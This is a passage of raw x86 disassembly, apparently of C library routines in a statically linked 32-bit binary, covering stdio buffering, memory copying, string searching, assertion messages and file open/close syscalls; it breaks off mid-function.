mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 0x1c]
test eax, eax
jne 0x804dbe0
test byte [ebx], 2
je 0x804dbcf
mov eax, dword [ebx + 0x5c]
test eax, eax
jle 0x804dbe5
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
call dword [eax + 0x34]
inc eax
je 0x804dbe5
mov esi, esi
mov ebx, dword [var_4h]
leave
ret
lea eax, [ebx + 0x48]
mov dword [var_ch], 0
mov dword [esp], ebx
mov dword [var_8h], eax
lea eax, [ebx + 0x47]
mov dword [var_sp_4h], eax
call fcn.0804db40
jmp 0x804dbe0
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov edx, dword [ebx + 0x58]
mov eax, dword [edx + 0x18]
test eax, eax
jne 0x80760b0
test byte [ebx], 2
jne 0x80760b8
mov eax, dword [edx + 0xb8]
mov dword [esp], ebx
call dword [eax + 0x34]
inc eax
je 0x80760b5
lea esi, [esi]
mov ebx, dword [var_4h]
leave
ret
mov edx, dword [ebx + 0x58]
lea eax, [edx + 0xb8]
mov dword [var_ch], 0
mov dword [esp], ebx
mov dword [var_8h], eax
lea eax, [edx + 0xb4]
mov dword [var_sp_4h], eax
call fcn.08075a60
jmp 0x80760b0
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_4h], esi
mov dword [var_8h], ebx
mov esi, dword [arg_8h]
mov ecx, dword [esi + 0x58]
mov ebx, dword [ecx + 0x18]
test ebx, ebx
je 0x8075ad0
mov edx, dword [esi]
test dl, 1
je 0x8075aa5
mov eax, dword [arg_ch]
mov dword [ecx + 0x18], eax
mov eax, dword [arg_10h]
mov dword [ecx + 0x1c], eax
mov eax, dword [arg_14h]
test eax, eax
je 0x8075aa0
and edx, 0xfffffffe
mov dword [esi], edx
mov esi, dword [var_4h]
mov ebx, dword [var_8h]
leave
ret
or edx, 1
jmp 0x8075a96
mov eax, dword [ecx + 0x1c]
sub eax, ebx
sar eax, 2
add eax, 0xfff
and eax, 0xfffff000
mov dword [var_sp_4h], eax
mov eax, dword [ecx + 0x18]
mov dword [esp], eax
call fcn.08054780
mov ecx, dword [esi + 0x58]
lea esi, [esi]
mov edx, dword [esi]
jmp 0x8075a80
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov edx, dword [ebx + 0x14]
cmp edx, dword [ebx + 0x10]
ja 0x804d7c0
mov ecx, dword [ebx]
test ch, 1
je 0x804d7ab
mov eax, dword [ebx + 0x28]
mov dword [ebx + 0xc], eax
and ch, 0xf7
mov dword [ebx + 4], edx
mov dword [ebx + 0x18], edx
mov dword [ebx + 0x14], edx
mov dword [ebx + 0x10], edx
mov dword [ebx], ecx
xor edx, edx
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
cmp edx, dword [ebx + 8]
mov eax, dword [ebx + 0x1c]
mov dword [ebx + 0xc], eax
jbe 0x804d791
mov dword [ebx + 8], edx
jmp 0x804d791
nop
lea esi, [esi]
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
mov dword [var_sp_4h], 0xffffffff
call dword [eax + 0xc]
mov edx, 0xffffffff
inc eax
je 0x804d7a4
mov edx, dword [ebx + 0x14]
jmp 0x804d784
push edi
mov ecx, dword [arg_10h]
mov edi, dword [arg_8h]
mov edx, esi
mov esi, dword [arg_ch]
mov eax, edi
sub eax, esi
cmp edi, eax
jae 0x80536bd
cld
shr ecx, 1
jae 0x80536ad
movsb byte es:[edi], byte ptr [esi]
shr ecx, 1
jae 0x80536b3
movsw word es:[edi], word ptr [esi]
rep movsd dword es:[edi], dword ptr [esi]
mov esi, edx
mov eax, dword [arg_8h]
pop edi
ret
std
lea edi, [edi + ecx - 1]
lea esi, [esi + ecx - 1]
shr ecx, 1
jae 0x80536cb
movsb byte es:[edi], byte ptr [esi]
sub edi, 1
sub esi, 1
shr ecx, 1
jae 0x80536d7
movsw word es:[edi], word ptr [esi]
sub edi, 2
sub esi, 2
rep movsd dword es:[edi], dword ptr [esi]
mov esi, edx
mov eax, dword [arg_8h]
cld
pop edi
ret
push ebp
mov eax, 0
mov ebp, esp
push esi
push ebx
sub esp, 0x28
test eax, eax
mov esi, dword [arg_14h]
je 0x805efe8
mov dword [var_4h], 0
mov dword [esp], 1
call section.
mov dword [var_8h], 5
mov dword [var_4h], str._s_s_s:_u:__s_sAssertion___s_failed._n
mov dword [esp], str.libc
call fcn.0805f1f0
mov ebx, 0x80a4f11
test esi, esi
mov edx, dword [arg_8h]
mov ecx, 0x8092923
mov dword [var_20h], edx
mov edx, ecx
cmove edx, ebx
mov dword [var_1ch], edx
mov edx, ebx
cmovne edx, esi
mov dword [var_18h], edx
mov edx, dword [arg_10h]
mov dword [var_14h], edx
mov edx, dword [arg_ch]
mov dword [var_10h], edx
mov edx, dword [0x80a95a0]
cmp byte [edx], 0
mov dword [var_4h], eax
mov dword [var_8h], edx
lea eax, [var_ch]
mov dword [esp], eax
cmove ecx, ebx
mov dword [var_sp_ch], ecx
call fcn.0806b830
test eax, eax
js 0x805f0b0
mov edx, dword [0x80a9504]
mov eax, dword [edx + 0x5c]
test eax, eax
jle 0x805f09f
mov eax, dword [var_ch]
mov dword [var_4h], 0x80a018c
mov dword [esp], edx
mov dword [var_8h], eax
call fcn.0804a310
mov eax, dword [0x80a9504]
mov dword [esp], eax
call fcn.08075080
mov eax, dword [var_ch]
mov dword [esp], eax
call fcn.08051180
call fcn.08062c50
mov eax, dword [var_ch]
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.08075140
jmp 0x805f082
mov dword [var_8h], 0x12
mov dword [var_4h], str.Unexpected_error._n
mov dword [esp], 2
call fcn.08053fd0
jmp 0x805f09a
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 4]
cmp eax, dword [ebx + 8]
jae 0x804c39c
movzx eax, byte [eax]
mov ebx, dword [var_4h]
leave
ret
mov dword [esp], ebx
call fcn.0804c060
test eax, eax
jne 0x804c3ba
mov eax, dword [ebx + 4]
cmp eax, dword [ebx + 8]
jb 0x804c394
or dword [ebx], 0x10
mov eax, 0xffffffff
jmp 0x804c397
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
call dword [eax + 0x10]
jmp 0x804c397
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov dword [esp], ebx
call fcn.0804c3d0
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
call dword [eax + 0x10]
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 0x8c
mov dword [var_4h], edi
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov edi, dword [arg_8h]
lea edx, [var_6ch]
mov eax, dword [edi + 0x94]
mov dword [esp], edi
mov dword [var_sp_4h], edx
call dword [eax + 0x48]
test eax, eax
jne 0x804c40b
mov eax, dword [var_5ch]
and eax, 0xf000
cmp eax, 0x8000
je 0x804c437
mov esi, dword [edi + 0x5c]
mov edx, 0x80929a0
mov eax, 0x8092b00
test esi, esi
cmovg eax, edx
mov dword [edi + 0x94], eax
mov eax, dword [edi + 0x58]
mov dword [eax + 0xb8], edx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov ecx, dword [var_3ch]
mov edx, dword [var_40h]
mov eax, ecx
or eax, edx
je 0x804c40b
test ecx, ecx
jg 0x804c40b
jl 0x804c451
cmp edx, 0xfffff
ja 0x804c40b
mov ebx, dword [edi + 0x4c]
mov esi, dword [edi + 0x50]
mov eax, ebx
and eax, esi
inc eax
je 0x804c468
cmp esi, ecx
jl 0x804c468
jg 0x804c40b
cmp ebx, edx
ja 0x804c40b
mov dword [var_14h], 0
mov dword [var_18h], 0
mov eax, dword [edi + 0x38]
mov dword [var_sp_ch], 1
mov dword [var_sp_8h], 1
mov dword [esp], 0
mov dword [var_10h], eax
mov eax, dword [var_40h]
mov dword [var_sp_4h], eax
call fcn.080546f0
mov dword [var_70h], eax
inc eax
je 0x804c40b
mov eax, dword [var_40h]
mov edx, dword [var_3ch]
mov dword [var_sp_ch], 0
mov dword [var_sp_4h], eax
mov dword [var_sp_8h], edx
mov eax, dword [edi + 0x38]
mov dword [esp], eax
call fcn.08054840
mov ebx, dword [var_3ch]
mov ecx, dword [var_40h]
mov esi, edx
xor esi, ebx
xor eax, ecx
or esi, eax
je 0x804c502
mov eax, dword [var_40h]
mov dword [var_sp_4h], eax
mov eax, dword [var_70h]
mov dword [esp], eax
call fcn.08054780
mov dword [edi + 0x50], 0xffffffff
mov dword [edi + 0x4c], 0xffffffff
jmp 0x804c40b
mov eax, dword [var_70h]
mov dword [var_sp_ch], 0
mov dword [esp], edi
add eax, dword [var_40h]
mov dword [var_sp_8h], eax
mov eax, dword [var_70h]
mov dword [var_sp_4h], eax
call fcn.0804db40
mov eax, dword [edi + 0x4c]
mov edx, dword [edi + 0x50]
and eax, edx
inc eax
jne 0x804c53c
mov dword [edi + 0x4c], 0
mov dword [edi + 0x50], 0
mov eax, dword [var_70h]
mov edx, dword [var_3ch]
mov dword [edi + 0xc], eax
add eax, dword [edi + 0x4c]
mov dword [edi + 4], eax
mov eax, dword [var_40h]
add dword [var_70h], eax
mov eax, dword [var_70h]
mov dword [edi + 8], eax
mov eax, dword [var_40h]
mov dword [edi + 0x50], edx
mov edx, 0x8092b60
mov dword [edi + 0x4c], eax
mov eax, dword [edi + 0x5c]
test eax, eax
mov eax, 0x8092a00
cmovg edx, eax
mov eax, dword [edi + 0x58]
mov dword [edi + 0x94], edx
mov dword [eax + 0xb8], 0x8092a00
jmp 0x804c42c
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x2c
mov edx, dword [arg_10h]
mov esi, dword [arg_ch]
mov ebx, dword [arg_8h]
test edx, edx
mov eax, dword [ebx + 0x54]
mov dword [var_14h], eax
je 0x804a3f7
mov edx, dword [ebx + 0x14]
cmp dword [ebx + 0x18], edx
je 0x804a42f
lea eax, [ebx + 0x14]
mov dword [var_18h], eax
mov eax, dword [var_18h]
mov dword [var_1ch], eax
mov eax, dword [ebx + 0x20]
mov dword [var_8h], esi
mov dword [var_sp_14h], edx
lea edx, [var_10h]
mov dword [var_sp_10h], edx
mov edx, dword [arg_10h]
mov dword [var_sp_18h], eax
lea eax, [esi + edx*4]
mov dword [var_ch], eax
mov eax, dword [ebx + 0x58]
add eax, 0x2c
mov dword [var_4h], eax
mov eax, dword [var_14h]
mov dword [esp], eax
call dword [eax + 4]
mov edx, dword [ebx + 0x10]
mov edi, eax
mov eax, dword [ebx + 0x14]
mov dword [esp], ebx
mov dword [var_4h], edx
sub eax, edx
mov dword [var_8h], eax
call fcn.0804bd90
mov edx, 0xffffffff
inc eax
je 0x804a425
mov edx, dword [var_10h]
mov eax, edx
sub eax, esi
sar eax, 2
sub dword [arg_10h], eax
test edi, edi
je 0x804a3e6
dec edi
jne 0x804a3f7
test eax, eax
je 0x804a3f7
mov eax, dword [arg_10h]
mov esi, edx
test eax, eax
je 0x804a3f7
mov edx, dword [ebx + 0x14]
jmp 0x804a372
mov eax, dword [ebx + 0x58]
test dword [ebx], 0x202
mov edx, dword [eax + 0x18]
mov dword [eax + 8], edx
mov dword [eax], edx
mov dword [eax + 4], edx
mov dword [eax + 0x10], edx
mov dword [eax + 0xc], edx
jne 0x804a416
mov edx, dword [eax + 0x1c]
mov dword [eax + 0x14], edx
xor eax, eax
cmp dword [arg_10h], 0
sete al
dec eax
mov edx, eax
add esp, 0x2c
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [ebx + 0x10]
cmp edx, eax
je 0x804a36c
sub edx, eax
mov dword [var_4h], eax
mov dword [esp], ebx
mov dword [var_8h], edx
call fcn.0804bd90
mov edx, 0xffffffff
inc eax
je 0x804a425
mov edx, dword [ebx + 0x14]
jmp 0x804a36c
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
and dword [eax], 0xfffffeff
mov eax, dword [eax + 0x58]
mov ecx, dword [eax + 4]
mov edx, dword [eax + 0x28]
mov dword [eax + 0x28], ecx
mov dword [eax + 4], edx
mov ecx, dword [eax + 8]
mov edx, dword [eax + 0x20]
mov dword [eax + 0x20], ecx
mov dword [eax + 8], edx
mov dword [eax], edx
leave
ret
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov edx, dword [ebx + 0x58]
mov eax, dword [edx + 0xc]
cmp dword [edx + 0x10], eax
ja 0x80761a0
mov ecx, dword [ebx]
test ch, 1
je 0x807618d
mov eax, dword [edx + 0x24]
mov dword [edx + 8], eax
mov eax, dword [edx + 0x10]
and ch, 0xf7
mov dword [ebx], ecx
mov dword [edx], eax
mov dword [edx + 0x14], eax
mov dword [edx + 0xc], eax
xor edx, edx
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
mov eax, dword [edx + 0x18]
mov dword [edx + 8], eax
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 4]
jbe 0x8076174
mov dword [edx + 4], eax
jmp 0x8076174
mov eax, dword [edx + 0xb8]
mov dword [esp], ebx
mov dword [var_sp_4h], 0xffffffff
call dword [eax + 0xc]
mov edx, 0xffffffff
inc eax
je 0x8076186
mov edx, dword [ebx + 0x58]
jmp 0x8076167
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov ecx, dword [eax + 0x30]
test ecx, ecx
je 0x804e6c4
mov dword [eax + 0x30], 0
mov edx, dword [eax + 0x24]
test edx, edx
jne 0x804e6cd
leave
ret
mov dword [arg_8h], eax
leave
jmp fcn.0804d7f0
push ebp
xor eax, eax
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov edi, dword [arg_10h]
mov esi, dword [arg_ch]
test edi, edi
je 0x8075f9c
mov eax, dword [arg_8h]
mov eax, dword [eax + 0x58]
mov ebx, dword [eax + 0x14]
mov dword [var_10h], eax
mov edx, eax
mov eax, dword [eax + 0x10]
sub ebx, eax
sar ebx, 2
test ebx, ebx
jle 0x8075f79
cmp ebx, edi
cmova ebx, edi
cmp ebx, 0x14
jg 0x8075fa8
test ebx, ebx
jle 0x8075fa4
mov edx, ebx
mov ecx, eax
dec edx
js 0x8075f71
mov eax, dword [esi]
add esi, 4
mov dword [ecx], eax
add ecx, 4
dec edx
jns 0x8075f64
mov eax, dword [var_10h]
mov dword [eax + 0x10], ecx
sub edi, ebx
test edi, edi
je 0x8075f97
mov eax, dword [esi]
mov edx, dword [arg_8h]
add esi, 4
mov dword [var_4h], eax
mov dword [esp], edx
call fcn.08075d10
inc eax
je 0x8075f97
dec edi
jmp 0x8075f35
mov eax, dword [arg_10h]
sub eax, edi
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
xor ebx, ebx
jmp 0x8075f77
mov dword [var_4h], esi
mov dword [var_8h], ebx
lea esi, [esi + ebx*4]
mov eax, dword [edx + 0x10]
mov dword [esp], eax
call fcn.080539d0
mov edx, dword [var_10h]
mov dword [edx + 0x10], eax
jmp 0x8075f77
push ebp
mov ebp, esp
shl dword [arg_10h], 2
leave
jmp fcn.08053740
push ebp
mov ebp, esp
sub esp, 0x20
cmp dword [arg_14h], 2
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, dword [arg_ch]
mov esi, dword [arg_10h]
mov edi, dword [arg_8h]
ja 0x80757e7
mov ecx, dword [arg_18h]
test ecx, ecx
je 0x8075790
mov ecx, dword [edi + 0x5c]
test ecx, ecx
js 0x80757de
test ecx, ecx
jle 0x8075790
mov eax, dword [edi + 0x58]
mov eax, dword [eax + 0x20]
test eax, eax
je 0x8075790
cmp dword [arg_14h], 1
je 0x80757c7
test ecx, ecx
js 0x80757bd
mov dword [esp], edi
call fcn.080761d0
mov edx, dword [arg_18h]
mov eax, dword [edi + 0x94]
mov dword [esp], edi
mov dword [var_sp_4h], ebx
mov dword [var_sp_8h], esi
mov dword [var_10h], edx
mov edx, dword [arg_14h]
mov dword [var_sp_ch], edx
call dword [eax + 0x24]
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov dword [esp], edi
call fcn.0804d7f0
jmp 0x8075790
test byte [edi + 1], 1
je 0x8075784
test ecx, ecx
jg 0x80757fe
mov eax, dword [edi + 8]
sub eax, dword [edi + 4]
cdq
sub ebx, eax
sbb esi, edx
jmp 0x8075784
mov edx, dword [edi + 0x24]
test edx, edx
jne 0x807577e
jmp 0x8075770
call fcn.08048b20
mov edx, 0xffffffff
mov dword [eax], 0x16
mov eax, 0xffffffff
jmp 0x80757b2
call fcn.08062c50
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x28
mov dword [var_20h], 0
mov esi, dword [var_sp_ch]
mov edi, dword [var_sp_4h]
mov ebx, dword [var_sp_8h]
movzx edx, word [edi]
test dx, dx
js 0x8075860
mov eax, 0
test eax, eax
je 0x8075860
lea eax, [var_1ch]
mov dword [var_20h], 1
mov dword [esp + 8], edi
mov dword [esp + 4], 0x8074580
mov dword [esp], eax
call section.
movzx edx, word [edi]
nop
lea esi, [esi]
test dx, dx
jns 0x80758c0
mov eax, dword [var_ch]
mov dword [esp + 4], ebx
mov dword [esp + 8], esi
mov dword [esp], edi
mov dword [var_10h_2], eax
mov eax, dword [var_10h]
mov dword [esp + 0xc], eax
call fcn.08075740
cmp word [edi], 0
mov ebx, eax
mov esi, edx
jns 0x80758b5
mov edi, dword [var_20h]
test edi, edi
jne 0x80758a0
add esp, 0x28
mov eax, ebx
mov edx, esi
pop ebx
pop esi
pop edi
leave
ret
lea eax, [var_1ch]
mov dword [esp + 4], 0
mov dword [esp], eax
call section.
jmp 0x8075894
mov dword [esp], edi
call fcn.08074580
jmp 0x807588d
nop
mov dword [esp], edi
call fcn.08074540
jmp 0x8075865
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
test byte [ebx + 1], 1
jne 0x807620d
mov eax, dword [ebx + 0x58]
mov eax, dword [eax + 0x20]
mov dword [esp], eax
call fcn.08051180
mov eax, dword [ebx + 0x58]
mov dword [eax + 0x20], 0
mov dword [eax + 0x28], 0
mov dword [eax + 0x24], 0
mov ebx, dword [var_4h]
leave
ret
mov dword [esp], ebx
call fcn.08075a00
jmp 0x80761e2
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov eax, dword [arg_8h]
mov edi, dword [arg_1ch]
mov ecx, dword [arg_10h]
mov edx, dword [arg_14h]
mov esi, dword [arg_18h]
test byte [eax + 0x3c], 2
jne 0x804b900
mov eax, ecx
mov dword [var_8h], edx
or ah, 0x80
test edi, edi
cmove ecx, eax
mov eax, dword [arg_ch]
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.08053ec0
mov edi, eax
xor eax, eax
test edi, edi
js 0x804b89f
mov edx, dword [arg_8h]
mov ebx, dword [arg_8h]
mov eax, dword [edx]
mov dword [edx + 0x38], edi
mov edx, esi
and edx, 0x100c
and esi, 0x1004
and eax, 0xffffeff3
or eax, edx
cmp esi, 0x1004
mov dword [ebx], eax
je 0x804b8a7
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0804d600
mov eax, dword [arg_8h]
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
mov dword [var_8h], 0
mov dword [var_10h], 3
mov dword [var_ch], 2
mov dword [var_4h], 0
call dword [eax + 0x24]
and eax, edx
inc eax
jne 0x804b891
call fcn.08048b20
cmp dword [eax], 0x1d
mov ecx, eax
je 0x804b891
mov ebx, edi
mov eax, 6
int 0x80
cmp eax, 0xfffff000
mov edx, eax
ja 0x804b8fa
xor eax, eax
jmp 0x804b89f
neg edx
mov dword [ecx], edx
jmp 0x804b8f6
mov eax, ecx
mov ebx, dword [arg_ch]
or ah, 0x80
test edi, edi
cmove ecx, eax
mov eax, 5
int 0x80
cmp eax, 0xfffff000
mov edi, eax
jbe 0x804b861
neg edi
call fcn.08048b20
mov dword [eax], edi
mov edi, 0xffffffff
jmp 0x804b861
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 8
mov edx, dword [arg_8h]
mov ebx, dword [arg_ch]
movzx ecx, byte [ebx]
test ecx, ecx
je 0x8053640
dec edx
inc edx
movzx eax, byte [edx]
test eax, eax
je 0x8053680
cmp eax, ecx
jne 0x80535d7
movzx edi, byte [ebx + 1]
test edi, edi
je 0x8053640
add ebx, 2
inc edx
movzx eax, byte [edx]
cmp eax, edi
je 0x8053624
lea esi, [esi]
cmp eax, ecx
je 0x805361c
test eax, eax
je 0x8053680
inc edx
movzx eax, byte [edx]
cmp eax, ecx
je 0x805361c
test eax, eax
je 0x8053680
inc edx
movzx eax, byte [edx]
cmp eax, ecx
jne 0x8053604
inc edx
movzx eax, byte [edx]
cmp eax, edi
jne 0x8053600
lea eax, [edx + 1]
mov dword [var_14h], eax
movzx eax, byte [edx + 1]
dec edx
mov dword [var_10h], ebx
movzx esi, byte [ebx]
cmp eax, esi
je 0x8053650
test esi, esi
mov ebx, dword [var_10h]
jne 0x805364a
mov eax, edx
add esp, 8
pop ebx
pop esi
pop edi
leave
ret
inc edx
movzx eax, byte [edx]
jmp 0x8053600
test esi, esi
je 0x8053640
inc dword [var_14h]
inc ebx
mov esi, dword [var_14h]
movzx eax, byte [esi]
movzx esi, byte [ebx]
cmp eax, esi
jne 0x8053639
test esi, esi
je 0x8053640
inc dword [var_14h]
inc ebx
mov esi, dword [var_14h]
movzx eax, byte [esi]
movzx esi, byte [ebx]
cmp eax, esi
je 0x8053650
jmp 0x8053639
lea esi, [esi]
xor eax, eax
jmp 0x8053642
push edi
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
mov dh, dl
mov ecx, edx
shl edx, 0x10
mov dx, cx
test al, 3
je 0x80538d3
mov cl, byte [eax]
cmp dl, cl
je 0x80539cd
test cl, cl
je 0x80539cd
inc eax
test al, 3
je 0x80538d3
mov cl, byte [eax]
cmp dl, cl
je 0x80539cd
test cl, cl
je 0x80539cd
inc eax
test al, 3
je 0x80538d3
mov cl, byte [eax]
cmp dl, cl
je 0x80539cd
test cl, cl
je 0x80539cd
inc eax
jmp 0x80538d3
lea esi, [esi]
add eax, 0x10
mov ecx, dword [eax]
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x80539af
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80539af
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x80539af
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80539af
mov ecx, dword [eax + 4]
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x80539ac
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80539ac
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x80539ac
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80539ac
mov ecx, dword [eax + 8]
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x80539a9
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80539a9
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x80539a9
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80539a9
mov ecx, dword [eax + 0xc]
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x80539a6
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80539a6
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x80539a6
xor edi, ecx
or edi, 0xfefefeff
inc edi
je 0x80538d0
add eax, 4
add eax, 4
add eax, 4
test cl, cl
je 0x80539cd
cmp cl, dl
je 0x80539cd
inc eax
test ch, ch
je 0x80539cd
cmp ch, dl
je 0x80539cd
inc eax
shr ecx, 0x10
test cl, cl
je 0x80539cd
cmp cl, dl
je 0x80539cd
inc eax
pop edi
ret
mov ecx, dword [arg_10h]
mov eax, edi
mov edi, dword [arg_4h]
mov edx, esi
mov esi, dword [arg_8h]
cld
shr ecx, 1
jae 0x8053756
movsb byte es:[edi], byte ptr [esi]
shr ecx, 1
jae 0x805375c
movsw word es:[edi], word ptr [esi]
rep movsd dword es:[edi], dword ptr [esi]
xchg edi, eax
mov esi, edx
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 4
mov dword [var_10h], 0
mov edi, dword [var_ch]
mov esi, dword [var_8h]
movzx ebx, byte [edi]
test bl, bl
je 0x804b58c
lea esi, [esi]
mov eax, dword [0x80a99f4]
movsx edx, bl
test byte [eax + edx*2], 8
jne 0x804b5c0
cmp bl, 0x5f
je 0x804b5c0
cmp bl, 0x2d
je 0x804b5c0
cmp bl, 0x2e
je 0x804b5c0
cmp bl, 0x2f
je 0x804b5af
inc edi
movzx eax, byte [edi]
test al, al
mov ebx, eax
jne 0x804b560
mov eax, dword [var_10h]
inc dword [var_10h]
dec eax
jle 0x804b5a0
mov byte [esi], 0
add esp, 4
pop ebx
pop esi
pop edi
leave
ret
mov byte [esi], 0x2f
mov eax, dword [var_10h]
inc esi
inc dword [var_10h]
dec eax
jle 0x804b5a0
jmp 0x804b595
inc dword [var_10h]
cmp dword [var_10h], 3
je 0x804b58c
mov byte [esi], 0x2f
inc esi
jmp 0x804b582
mov esi, esi
mov eax, dword [0x80a99fc]
movsx edx, bl
mov ecx, esi
inc esi
mov eax, dword [eax + edx*4]
mov byte [ecx], al
jmp 0x804b582
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_8h], ebx
mov dword [var_4h], edx
mov dword [esp], 0x8093633
mov ebx, eax
mov dword [var_bp_4h], esi
lea eax, [eax + 4]
mov esi, edx
mov dword [var_sp_8h], eax
call fcn.08053a00
test eax, eax
mov dword [ebx], eax
jne 0x8053d00
mov ecx, dword [ebx]
xor eax, eax
test ecx, ecx
je 0x8053cec
mov edx, dword [ebx + 8]
test edx, edx
jne 0x8053cf1
mov eax, 1
mov ebx, dword [var_8h]
mov esi, dword [var_bp_4h]
leave
ret
lea esi, [esi]
lea eax, [ebx + 0xc]
mov dword [var_4h], 0x8093633
mov dword [esp], esi
mov dword [var_sp_8h], eax
call fcn.08053a00
test eax, eax
mov dword [ebx + 8], eax
jne 0x8053cdd
mov edx, dword [ebx + 4]
mov eax, dword [ebx]
call fcn.08057110
jmp 0x8053cdd
push ebp
mov ebp, esp
sub esp, 0x1c
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, dword [arg_8h]
mov esi, dword [arg_ch]
mov edi, dword [arg_10h]
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
call dword [eax + 0x30]
xor edx, edx
inc eax
je 0x804de3e
test esi, esi
je 0x804ddf1
test edi, edi
jne 0x804de4b
or dword [ebx], 2
lea eax, [ebx + 0x48]
mov dword [var_sp_ch], 0
mov dword [var_sp_8h], eax
lea eax, [ebx + 0x47]
mov dword [var_sp_4h], eax
mov dword [esp], ebx
call fcn.0804db40
mov dword [ebx + 0x18], 0
mov dword [ebx + 0x14], 0
mov dword [ebx + 0x10], 0
mov dword [ebx + 8], 0
mov dword [ebx + 4], 0
mov dword [ebx + 0xc], 0
mov edx, ebx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov eax, edx
mov edi, dword [var_4h]
leave
ret
lea eax, [edi + esi]
and dword [ebx], 0xfffffffd
mov dword [var_sp_4h], esi
mov dword [var_sp_ch], 0
mov dword [var_sp_8h], eax
jmp 0x804de0a
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [arg_10h]
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov dword [var_8h], eax
mov dword [esp], ebx
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
call fcn.0804ddc0
xor edx, edx
test eax, eax
je 0x804bd1f
mov eax, dword [ebx + 0x1c]
mov edx, ebx
mov dword [ebx + 0x18], eax
mov dword [ebx + 0x14], eax
mov dword [ebx + 0x10], eax
mov dword [ebx + 0xc], eax
mov dword [ebx + 4], eax
mov dword [ebx + 8], eax
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov edi, dword [arg_ch]
mov ebx, dword [arg_8h]
test byte [ebx + 1], 0x10
je 0x804be6b
mov dword [ebx + 0x4c], 0xffffffff
mov dword [ebx + 0x50], 0xffffffff
mov edx, dword [ebx + 0x94]
mov eax, dword [arg_10h]
mov dword [esp], ebx
mov dword [var_4h], edi
mov dword [var_8h], eax
call dword [edx + 0x3c]
mov esi, eax
movzx eax, word [ebx + 0x44]
test ax, ax
je 0x804be1d
test esi, esi
jne 0x804be50
mov edx, dword [ebx + 0x5c]
mov eax, dword [ebx + 0x1c]
test edx, edx
mov dword [ebx + 0xc], eax
mov dword [ebx + 4], eax
mov dword [ebx + 8], eax
mov dword [ebx + 0x14], eax
mov dword [ebx + 0x10], eax
jle 0x804be46
mov eax, dword [ebx + 0x20]
mov dword [ebx + 0x18], eax
add esp, 0x10
mov eax, esi
pop ebx
pop esi
pop edi
leave
ret
test dword [ebx], 0x202
jne 0x804be39
jmp 0x804be36
movzx eax, ax
mov dword [var_8h], esi
mov dword [var_4h], edi
dec eax
mov dword [esp], eax
call fcn.0804e230
inc eax
mov word [ebx + 0x44], ax
jmp 0x804be1d
mov ecx, dword [ebx + 8]
mov edx, dword [ebx + 0x10]
cmp ecx, edx
je 0x804bdf7
mov eax, dword [ebx + 0x94]
sub edx, ecx
xor esi, esi
mov ecx, edx
